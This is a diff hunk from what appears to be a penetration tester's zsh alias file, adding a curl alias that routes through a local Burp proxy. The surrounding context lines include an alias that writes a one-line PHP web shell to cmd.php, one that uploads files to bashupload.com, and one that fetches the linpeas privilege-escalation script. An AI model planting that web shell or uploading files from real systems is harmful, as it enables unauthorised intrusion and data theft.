@@ -179,4 +179,5 @@ alias tty_conf="stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;s/li
 alias linpeas="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -s --output lin.sh"
 alias upload='curl bashupload.com -T "${@}"'
 alias phpcmd='echo "<?=\`\$_GET[0]\`?>" > cmd.php && echo "[+] wrote <?=\`\$_GET[0]\`?> in cmd.php"'
+alias burl='curl -x http://127.0.0.1:8080/ -k'
 export PATH=~/zsh-aliases/shells/:$PATH
